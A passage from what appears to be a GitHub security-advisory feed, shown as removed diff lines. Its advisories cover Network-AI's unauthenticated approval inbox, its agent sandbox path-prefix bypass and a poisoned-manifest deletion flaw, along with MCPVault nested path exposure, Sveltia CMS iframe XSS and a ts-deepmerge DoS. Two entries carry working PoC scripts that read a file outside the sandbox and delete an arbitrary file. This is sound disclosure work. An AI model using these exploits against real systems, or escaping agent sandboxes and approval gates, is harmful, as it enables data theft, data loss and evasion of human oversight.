-<li><strong>The operator cannot fix it within the library.</strong> Unlike the MCP server (which now <em>accepts</em> a secret), <code>ApprovalInbox</code> exposes <strong>no</strong> auth option and <strong>hardcodes</strong> <code>Access-Control-Allow-Origin: *</code>. So "the operator should add auth / restrict CORS" is not available — there is no hook to do so. And "it's opt-in / operator-exposed" did not exempt the MCP server, which is equally optional and explicitly started.</li>
-</ul>
-<p><strong>Honest scope caveat (state it plainly in the report).</strong> <code>ApprovalInbox.startServer()</code> is opt-in (not auto-started by a CLI bin) and defaults to <code>127.0.0.1</code>, so the realistic vectors are (a) the wildcard-CORS drive-by from a page the operator visits, (b) a co-located/SSRF local process, or (c) a non-loopback bind. That bounds severity to Medium–High — but it is squarely the same class, on the same kind of surface, that the project's threat model and prior advisories already treat as a vulnerability.</p>
-<h2 id="recommended-fix">Recommended fix</h2>
-<ol>
-<li><strong>Require a bearer secret</strong> on the inbox HTTP server, fail closed on empty secret, and verify it on <code>/approve</code>, <code>/deny</code>, and ideally the list/stats/SSE routes — mirroring the hardening already applied to <code>McpSseServer</code>/<code>McpHttpServer</code>.</li>
-<li><strong>Remove the hardcoded <code>Access-Control-Allow-Origin: *</code></strong>; default to no CORS (same-origin) or an explicit allowlist, and never reflect <code>*</code> on the mutating routes.</li>
-<li>Optionally add a CSRF token / require a non-simple custom header on <code>POST</code> to block browser-driven approval.</li>
-</ol>
-<h2 id="references">References</h2>
-<ul>
-<li><a href="https://cwe.mitre.org/data/definitions/862.html">CWE-862</a>, <a href="https://cwe.mitre.org/data/definitions/352.html">CWE-352</a></li>
-<li>Affected: <code>lib/approval-inbox.ts</code> (<code>httpHandler</code> l.256 CORS, <code>routeRequest</code> l.369-405 no-auth approve/deny, <code>startServer</code> l.281); exported at <code>index.ts:1126</code>.</li>
-<li>Same class as prior <strong>accepted</strong> advisories: GHSA-fj4g-2p96-q6m3 (MCP missing auth, fixed v5.1.3), GHSA-j3vx-cx2r-pvg8 (MCP unauthenticated cross-origin invocation — fixed v5.4.5 by requiring a secret + restricting CORS to localhost), GHSA-r78r-rwrf-rjwp (MCP fail-closed on empty secret, v5.7.2). The <code>ApprovalInbox</code> server never received this hardening.</li>
-<li>Documentation this finding is measured against: <code>SECURITY.md</code> (Approval Inbox listed under "Security Measures"; Approval Gate = human-in-the-loop for "writes, shell commands, budget spend"), <code>THREAT_MODEL.md</code> §3.1 ("Unauthenticated Network Caller" adversary + its mitigations), <code>README.md</code> / <code>ENTERPRISE.md</code> ("web-accessible approval queue"). None document the inbox as intentionally unauthenticated or require operator-supplied auth.</li>
-<li>Disclosure: GitHub private security advisory (Jovancoding/Network-AI → Security → "Report a vulnerability"), per SECURITY.md.</li>
-</ul>
-<hr>
-<h3 id="resolution-maintainer">Resolution (maintainer)</h3>
-<p><strong>Fixed in <a href="https://github.com/Jovancoding/Network-AI/releases/tag/v5.12.2">v5.12.2</a> (commit <code>a59c13a</code>).</strong> Install: <code>npm install network-ai@5.12.2</code> — published to npm with provenance.</p>
-<p><code>ApprovalInbox</code> now accepts a <code>secret</code> option. When set, the mutating endpoints <code>POST /:id/approve</code> and <code>POST /:id/deny</code> require an <code>Authorization: Bearer &lt;secret&gt;</code> header, validated in constant time with <code>crypto.timingSafeEqual</code>. <code>startServer()</code> already binds to <code>127.0.0.1</code> by default; operators exposing the inbox on a network must set a secret.</p>
-<p>All 3,269 tests pass against the patched build. Thanks to @EchoSkorJjj for the responsible disclosure.</p>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/Jovancoding/Network-AI/security/advisories/GHSA-mxjx-28vx-xjjj">https://github.com/Jovancoding/Network-AI/security/advisories/GHSA-mxjx-28vx-xjjj</a></li>
-<li><a href="https://github.com/Jovancoding/Network-AI/commit/a59c13a1f0ce0e8a0779a90343eef92fac5ab4c3">https://github.com/Jovancoding/Network-AI/commit/a59c13a1f0ce0e8a0779a90343eef92fac5ab4c3</a></li>
-<li><a href="https://github.com/Jovancoding/Network-AI/releases/tag/v5.12.2">https://github.com/Jovancoding/Network-AI/releases/tag/v5.12.2</a></li>
-<li><a href="https://github.com/advisories/GHSA-mxjx-28vx-xjjj">https://github.com/advisories/GHSA-mxjx-28vx-xjjj</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-mxjx-28vx-xjjj</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-19T21:42:32.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[network-ai] Network-AI: AgentRuntime sandbox path-prefix checks allow file access outside the configured base directory]]></title>
-        <id>https://github.com/advisories/GHSA-jvcm-f35g-w78p</id>
-        <link href="https://github.com/advisories/GHSA-jvcm-f35g-w78p"/>
-        <updated>2026-06-19T21:42:30.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p><code>AgentRuntime</code> promises scoped file access under a configured sandbox <code>basePath</code>, but its path containment checks use raw string prefix tests. A sandbox base such as <code>/tmp/network-ai-sandbox</code> also matches a sibling path such as <code>/tmp/network-ai-sandbox_evil/secret.txt</code>.</p>
-<p>An agent/user that can call <code>AgentRuntime.readFile()</code> or <code>AgentRuntime.listDir()</code> can read or list files outside the intended sandbox when the target path is in a sibling directory sharing the base path prefix. This breaks the documented sandbox boundary. Confirmed in Network-AI 5.12.1. Severity: Medium, CVSS 3.1 vector <code>CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N</code>.</p>
-<h3 id="details">Details</h3>
-<p>The vulnerable containment check is in <code>lib/agent-runtime.ts</code>:</p>
-<pre><code class="language-ts">resolvePath(filePath: string): string | null {
-  const normalized = normalize(filePath);
-  const absolute = isAbsolute(normalized)
-    ? normalized
-    : join(this.config.basePath, normalized);
-  const resolved = resolve(absolute);
-
-  // Traversal check
-  if (!resolved.startsWith(this.config.basePath)) return null;
-  return resolved;
-}
-</code></pre>
-<p><code>startsWith()</code> is not path-boundary-aware. If <code>this.config.basePath</code> is <code>/tmp/network-ai-sandbox</code>, then <code>/tmp/network-ai-sandbox_evil/secret.txt</code> also starts with <code>/tmp/network-ai-sandbox</code> despite being outside the sandbox.</p>
-<p>The same pattern appears in <code>SandboxPolicy.isPathAllowed()</code> for allowed and blocked paths. <code>FileAccessor.read()</code>, <code>FileAccessor.write()</code>, and <code>FileAccessor.list()</code> rely on these checks before I/O, and <code>AgentRuntime.readFile()</code> exposes this behavior. Reads auto-approve by default when <code>autoApproveReads</code> is enabled.</p>
-<p>Affected source evidence:</p>
-<ul>
-<li><code>lib/agent-runtime.ts:393-423</code> — <code>isPathAllowed()</code> / <code>resolvePath()</code> use string <code>startsWith()</code> containment.</li>
-<li><code>lib/agent-runtime.ts:669-691</code> — file read sink relies on those checks.</li>
-<li><code>lib/agent-runtime.ts:933-958</code> — <code>AgentRuntime.readFile()</code> exposes file reads.</li>
-</ul>
-<h3 id="poc">PoC</h3>
-<p>Run from the repository root after installing dependencies:</p>
-<pre><code class="language-bash">node -r ts-node/register/transpile-only - &lt;&lt;'TS'
-const { mkdtempSync, mkdirSync, writeFileSync, rmSync } = require('fs');
-const { tmpdir } = require('os');
-const { join } = require('path');
-const { AgentRuntime } = require('./lib/agent-runtime');
-
-(async () =&gt; {
-  const parent = mkdtempSync(join(tmpdir(), 'network-ai-poc-'));
-  const base = join(parent, 'sandbox');
-  const sibling = join(parent, 'sandbox_evil');
-  mkdirSync(base);
-  mkdirSync(sibling);
-  writeFileSync(join(sibling, 'secret.txt'), 'SECRET_OUTSIDE_SANDBOX', 'utf8');
-
-  const runtime = new AgentRuntime({
-    policy: { basePath: base, allowedPaths: ['.'], allowedCommands: [] },
-  });
-
-  const absoluteRead = await runtime.readFile(join(sibling, 'secret.txt'), 'poc-agent');
-  const relativeRead = await runtime.readFile('../sandbox_evil/secret.txt', 'poc-agent');
-  console.log(JSON.stringify({
-    base,
-    outside: join(sibling, 'secret.txt'),
-    absoluteRead: { success: absoluteRead.success, content: absoluteRead.content },
-    relativeRead: { success: relativeRead.success, content: relativeRead.content },
-  }, null, 2));
-  rmSync(parent, { recursive: true, force: true });
-})();
-TS
-</code></pre>
-<p>Observed result: both reads succeed and return <code>SECRET_OUTSIDE_SANDBOX</code>, even though the file is outside <code>basePath</code>.</p>
-<h3 id="impact">Impact</h3>
-<p>An agent/user with access to <code>AgentRuntime</code> file operations can bypass the intended sandbox root and read or list files outside the sandbox when those files are located in sibling paths sharing the sandbox base path prefix. This is a sandbox boundary bypass and path traversal vulnerability. Default confirmed impact is read/list disclosure. If an embedding application uses <code>FileAccessor.write()</code> directly or auto-approves runtime writes, the same root cause may allow writes outside the intended sandbox to prefix-collision sibling paths. No RCE chain was confirmed.</p>
-<hr>
-<h3 id="resolution-maintainer">Resolution (maintainer)</h3>
-<p><strong>Fixed in <a href="https://github.com/Jovancoding/Network-AI/releases/tag/v5.12.2">v5.12.2</a> (commit <code>a59c13a</code>).</strong> Install: <code>npm install network-ai@5.12.2</code> — published to npm with provenance.</p>
-<p><code>SandboxPolicy.resolvePath()</code> and <code>isPathAllowed()</code> now use separator-anchored prefix checks (<code>resolved === base || resolved.startsWith(base + path.sep)</code>) for both the allow-list and block-list. A sibling directory that merely shares a name prefix (e.g. <code>/srv/app-evil</code> vs base <code>/srv/app</code>) is no longer treated as in-scope.</p>
-<p>All 3,269 tests pass against the patched build. Thanks to @sondt99 for the responsible disclosure.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/Jovancoding/Network-AI/security/advisories/GHSA-jvcm-f35g-w78p">https://github.com/Jovancoding/Network-AI/security/advisories/GHSA-jvcm-f35g-w78p</a></li>
-<li><a href="https://github.com/Jovancoding/Network-AI/commit/a59c13a1f0ce0e8a0779a90343eef92fac5ab4c3">https://github.com/Jovancoding/Network-AI/commit/a59c13a1f0ce0e8a0779a90343eef92fac5ab4c3</a></li>
-<li><a href="https://github.com/Jovancoding/Network-AI/releases/tag/v5.12.2">https://github.com/Jovancoding/Network-AI/releases/tag/v5.12.2</a></li>
-<li><a href="https://github.com/advisories/GHSA-jvcm-f35g-w78p">https://github.com/advisories/GHSA-jvcm-f35g-w78p</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jvcm-f35g-w78p</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-19T21:42:29.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[network-ai] Network-AI: Poisoned environment backup manifest allows arbitrary recursive deletion during backup pruning]]></title>
-        <id>https://github.com/advisories/GHSA-2fmp-9rvw-hc96</id>
-        <link href="https://github.com/advisories/GHSA-2fmp-9rvw-hc96"/>
-        <updated>2026-06-19T21:42:30.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p><code>EnvironmentManager.listBackups()</code> reads each backup's <code>_manifest.json</code> and trusts the manifest's <code>path</code> field. <code>EnvironmentManager.pruneBackups()</code> later passes that trusted <code>entry.path</code> directly to <code>rmSync(entry.path, { recursive: true, force: true })</code>.</p>
-<p>An attacker who can place or modify a manifest inside <code>data/&lt;env&gt;/.backups/&lt;name&gt;/_manifest.json</code> can cause <code>network-ai env backup prune --env &lt;env&gt; --keep &lt;n&gt;</code> or any code path invoking <code>pruneBackups()</code> to recursively delete an arbitrary path accessible to the Network-AI process user. Confirmed in Network-AI 5.12.1.</p>
-<h3 id="details">Details</h3>
-<p><code>listBackups()</code> trusts manifest content from disk:</p>
-<pre><code class="language-ts">for (const name of readdirSync(backupsDir)) {
-  const manifest = join(backupsDir, name, '_manifest.json');
-  if (existsSync(manifest)) {
-    try {
-      const entry = JSON.parse(readFileSync(manifest, 'utf-8')) as BackupEntry;
-      entries.push(entry);
-    } catch { /* corrupt manifest, skip */ }
-  }
-}
-</code></pre>
-<p><code>pruneBackups()</code> uses the attacker-controlled <code>entry.path</code> as the deletion target:</p>
-<pre><code class="language-ts">const toDelete = all.slice(keep);
-let deleted = 0;
-for (const entry of toDelete) {
-  try {
-    rmSync(entry.path, { recursive: true, force: true });
-    deleted++;
-  } catch { /* ignore */ }
-}
-</code></pre>
-<p>Default CLI reachability exists through <code>network-ai env backup prune --env &lt;env&gt; --keep &lt;n&gt;</code>.</p>
-<p>Affected source evidence:</p>
-<ul>
-<li><code>lib/env-manager.ts:505-523</code> — reads trusted backup entries from <code>_manifest.json</code>.</li>
-<li><code>lib/env-manager.ts:529-541</code> — recursively deletes <code>entry.path</code>.</li>
-<li><code>bin/cli.ts:464-472</code> — default CLI exposes backup pruning.</li>
-</ul>
-<h3 id="poc">PoC</h3>
-<p>This PoC uses only a temporary directory and deletes only a temporary file:</p>
-<pre><code class="language-bash">TMP=$(mktemp -d)
-TMPBASE="$TMP" node -r ts-node/register/transpile-only - &lt;&lt;'TS'
-const { EnvironmentManager } = require('./lib/env-manager');
-const fs = require('fs');
-const path = require('path');
-const base = process.env.TMPBASE;
-
-const mgr = new EnvironmentManager(path.join(base, 'data'), {
-  chain: ['dev', 'st'],
-  gates: { dev: 'auto', st: 'auto' },
-});
-
-mgr.init('dev');
-fs.writeFileSync(path.join(base, 'victim.txt'), 'safe');
-
-const backupsDir = path.join(base, 'data', 'dev', '.backups');
-fs.mkdirSync(path.join(backupsDir, 'evil'), { recursive: true });
-fs.writeFileSync(
-  path.join(backupsDir, 'evil', '_manifest.json'),
-  JSON.stringify({
-    backupId: 'evil',
-    env: 'dev',
-    timestamp: '2000-01-01T00:00:00.000Z',
-    sizeBytes: 0,
-    path: path.join(base, 'victim.txt'),
-  })
-);
-
-console.log(JSON.stringify({
-  before: fs.existsSync(path.join(base, 'victim.txt')),
-  deleted: mgr.pruneBackups('dev', 0),
-  after: fs.existsSync(path.join(base, 'victim.txt')),
-}, null, 2));
-
-fs.rmSync(base, { recursive: true, force: true });
-TS
-</code></pre>
-<p>Observed result: <code>before</code> is <code>true</code>, <code>deleted</code> is <code>1</code>, and <code>after</code> is <code>false</code>, proving deletion occurred outside <code>data/dev/.backups</code>.</p>
-<h3 id="impact">Impact</h3>
-<p>An attacker with write access to the Network-AI data directory can cause recursive deletion of arbitrary filesystem paths accessible to the Network-AI process user when backup pruning runs. This can delete project files, data directories, or other process-writable paths, causing data loss and denial of service. No RCE chain was confirmed.</p>
-<hr>
-<h3 id="resolution-maintainer">Resolution (maintainer)</h3>
-<p><strong>Fixed in <a href="https://github.com/Jovancoding/Network-AI/releases/tag/v5.12.2">v5.12.2</a> (commit <code>a59c13a</code>).</strong> Install: <code>npm install network-ai@5.12.2</code> — published to npm with provenance.</p>
-<p><code>pruneBackups()</code> no longer passes <code>entry.path</code> from the on-disk manifest to <code>rmSync</code>. The deletion path is recomputed from a format-validated <code>entry.backupId</code>, and a <code>dirname</code> containment check confines deletion to exactly one level under the backups directory. A poisoned manifest (e.g. <code>"path": "/"</code>) is now inert.</p>
-<p>All 3,269 tests pass against the patched build. Thanks to @sondt99 for the responsible disclosure.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/Jovancoding/Network-AI/security/advisories/GHSA-2fmp-9rvw-hc96">https://github.com/Jovancoding/Network-AI/security/advisories/GHSA-2fmp-9rvw-hc96</a></li>
-<li><a href="https://github.com/Jovancoding/Network-AI/commit/a59c13a1f0ce0e8a0779a90343eef92fac5ab4c3">https://github.com/Jovancoding/Network-AI/commit/a59c13a1f0ce0e8a0779a90343eef92fac5ab4c3</a></li>
-<li><a href="https://github.com/Jovancoding/Network-AI/releases/tag/v5.12.2">https://github.com/Jovancoding/Network-AI/releases/tag/v5.12.2</a></li>
-<li><a href="https://github.com/advisories/GHSA-2fmp-9rvw-hc96">https://github.com/advisories/GHSA-2fmp-9rvw-hc96</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-2fmp-9rvw-hc96</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-19T21:42:26.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@bitbonsai/mcpvault] MCPVault: PathFilter restricted directories (.git/.obsidian/node_modules) only denied at vault root, not nested]]></title>
-        <id>https://github.com/advisories/GHSA-9c83-rr99-vfwj</id>
-        <link href="https://github.com/advisories/GHSA-9c83-rr99-vfwj"/>
-        <updated>2026-06-19T21:42:25.000Z</updated>
-        <content type="html"><![CDATA[<p>PathFilter's deny-list glob patterns are anchored, so <code>.git</code>, <code>.obsidian</code>, and <code>node_modules</code> were only blocked at the vault root. Nested copies inside the vault (e.g. <code>tools/cli/node_modules/...</code>, <code>tools/somerepo/.git/config</code>, a nested <code>.obsidian/</code>) were fully traversable via isAllowed/isAllowedForListing. Impact: a nested <code>.git/config</code> (remote URLs / embedded tokens) and nested <code>.obsidian</code> contents could be read, under the same prompt-injection threat model as GHSA-j99q-93c9-h869 (an attacker influences the path an agent reads). It also caused nested <code>node_modules</code> to pollute the tag index (#128, the public symptom). Fixed in 0.11.5 by denying these restricted names at any path depth (matched case-insensitively as any path segment).</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/bitbonsai/mcpvault/security/advisories/GHSA-9c83-rr99-vfwj">https://github.com/bitbonsai/mcpvault/security/advisories/GHSA-9c83-rr99-vfwj</a></li>
-<li><a href="https://github.com/advisories/GHSA-9c83-rr99-vfwj">https://github.com/advisories/GHSA-9c83-rr99-vfwj</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-9c83-rr99-vfwj</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-19T21:42:24.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@sveltia/cms] Sveltia CMS: Stored XSS in Markdown/RichText preview via unsandboxed same-origin iframe]]></title>
-        <id>https://github.com/advisories/GHSA-h5jc-78hr-3pc9</id>
-        <link href="https://github.com/advisories/GHSA-h5jc-78hr-3pc9"/>
-        <updated>2026-06-19T21:42:20.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>A stored cross-site scripting (XSS) vulnerability affected the Markdown/RichText field preview renderer in Sveltia CMS.</p>
-<p>The DOMPurify sanitization configuration used for Markdown previews explicitly permitted <code>iframe</code> elements without enforcing a <code>sandbox</code> attribute or restricting iframe sources. Sanitized Markdown output was then inserted into the CMS preview DOM as raw HTML. Because no sandboxing or source validation was applied, a Markdown field containing an <code>iframe</code> whose src pointed to a same-origin uploaded or publicly accessible HTML asset would render an unsandboxed iframe. JavaScript in the framed document could then access the parent CMS window via the browser’s same-origin policy, allowing it to read and write the parent window’s state, DOM, and browser storage, and to trigger actions in the CMS context.</p>
-<p>The practical impact is limited in currently supported Sveltia CMS usage because the CMS is intended for a single developer or a small trusted team, and <a href="https://sveltiacms.app/en/docs/workflows/open">open authoring</a> / untrusted multi-user authoring is not currently implemented. Exploitation requires the ability to place malicious content into the repository or content source that the CMS loads.</p>
-<h3 id="patches">Patches</h3>
-<p>The issue has been patched by replacing the direct DOMPurify call in the Markdown preview renderer with a two-pass sanitization pipeline:</p>
-<ol>
-<li>DOMPurify processes the raw HTML as before.</li>
-<li>A post-processing step validates every <code>iframe</code> element in the sanitized output. Any iframe whose src does not use an <code>https://</code> URL, uses a same-origin URL, uses a relative path, or uses any other non-HTTPS scheme (<code>javascript:</code>, <code>data:</code>, <code>blob:</code>, , etc.) is removed from the output. Surviving iframes (HTTPS cross-origin only) have a <code>sandbox</code> attribute enforced with at minimum <code>allow-scripts allow-same-origin</code>, which confines the framed document to its own origin and prevents it from accessing the parent CMS window.</li>
-</ol>
-<p>Users should upgrade to Sveltia CMS <a href="https://github.com/sveltia/sveltia-cms/releases/tag/v0.167.3">v0.167.3</a> or later.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>If upgrading is not immediately possible, avoid loading CMS content from untrusted authors and review Markdown field content for <code>iframe</code> elements pointing to same-origin or relative paths.</p>
-<p>Administrators can also reduce exposure by limiting repository or content source write access to trusted users only.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/sveltia/sveltia-cms/commit/8c46294eadf52a8ac48740ccb5054b99d65cff1b">sveltia/sveltia-cms@<code>8c46294</code></a></li>
-<li><a href="https://github.com/sveltia/sveltia-cms/releases/tag/v0.167.3">https://github.com/sveltia/sveltia-cms/releases/tag/v0.167.3</a></li>
-</ul>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/sveltia/sveltia-cms/security/advisories/GHSA-h5jc-78hr-3pc9">https://github.com/sveltia/sveltia-cms/security/advisories/GHSA-h5jc-78hr-3pc9</a></li>
-<li><a href="https://github.com/sveltia/sveltia-cms/commit/8c46294eadf52a8ac48740ccb5054b99d65cff1b">https://github.com/sveltia/sveltia-cms/commit/8c46294eadf52a8ac48740ccb5054b99d65cff1b</a></li>
-<li><a href="https://github.com/sveltia/sveltia-cms/releases/tag/v0.167.3">https://github.com/sveltia/sveltia-cms/releases/tag/v0.167.3</a></li>
-<li><a href="https://github.com/advisories/GHSA-h5jc-78hr-3pc9">https://github.com/advisories/GHSA-h5jc-78hr-3pc9</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-h5jc-78hr-3pc9</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-06-19T21:42:20.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[ts-deepmerge] ts-deepmerge: Prototype Method Override leads to DoS]]></title>
-        <id>https://github.com/advisories/GHSA-87mf-gv2c-c62c</id>
-        <link href="https://github.com/advisories/GHSA-87mf-gv2c-c62c"/>
-        <updated>2026-06-19T21:41:53.000Z</updated>
-        <content type="html"><![CDATA[<p>Versions of the package ts-deepmerge before 8.0.0 are vulnerable to Uncaught Exception due to the improper handling of built-in Object.prototype methods (such as toString, valueOf). When user-controlled input contains these keys with non-function values, the resulting merged object becomes broken — any string context operation throws a TypeError, crashing the application.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-12644">https://nvd.nist.gov/vuln/detail/CVE-2026-12644</a></li>
-<li><a href="https://github.com/voodoocreation/ts-deepmerge/commit/305a05831a462fb2c353d3cbbff55a0733286f8c">https://github.com/voodoocreation/ts-deepmerge/commit/305a05831a462fb2c353d3cbbff55a0733286f8c</a></li>
-<li><a href="https://gist.github.com/igorg1312/775fa00114c4d47df6ae0551779ab407">https://gist.github.com/igorg1312/775fa00114c4d47df6ae0551779ab407</a></li>
-<li><a href="https://security.snyk.io/vuln/SNYK-JS-TSDEEPMERGE-17339141">https://security.snyk.io/vuln/SNYK-JS-TSDEEPMERGE-17339141</a></li>
-<li><a href="https://github.com/advisories/GHSA-87mf-gv2c-c62c">https://github.com/advisories/GHSA-87mf-gv2c-c62c</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-87mf-gv2c-c62c</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-19T06:31:56.000Z</published>
     </entry>
 </feed>
